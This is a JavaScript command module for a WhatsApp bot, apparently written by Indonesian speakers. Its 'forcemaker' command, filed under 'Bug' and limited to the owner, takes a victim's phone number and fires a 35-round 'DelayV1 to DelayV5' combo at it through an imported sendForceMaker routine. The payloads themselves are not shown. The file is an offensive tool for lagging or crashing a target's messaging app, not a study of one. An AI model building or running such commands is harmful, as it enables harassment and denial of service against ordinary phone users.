import {
  sendForceMaker,
  requirePhoneTarget,
  getBugTargetBlockReason,
  replyProcessing,
  replyDone,
  replyFailed,
} from "@/src/services/system/bug/index.js";

export default {
  name: "forcemaker",
  aliases: [],
  description: "Kirim full combo DelayV1 s/d DelayV5 ke nomor target (35 iterasi)",
  usage: "628xxx",
  category: "Bug",
  ownerOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner, logger }) => {
    const q = args.join(" ");
    if (!q) return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    let target;
    try {
      target = requirePhoneTarget(q);
    } catch (_) {
      return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    }
    const blocked = getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
    if (blocked) return reply(blocked);
    await replyProcessing(reply, target, commandName);
    try {
      const { success, failed, ms } = await sendForceMaker(sock, target, { loops: 35, logger });
      await replyDone(reply, target, commandName, { success, failed, ms });
    } catch (err) {
      logger?.error?.(`[forcemaker] gagal ke ${target}: ${err?.message || err}`);
      await replyFailed(reply, target, commandName, err);
    }
  },
};
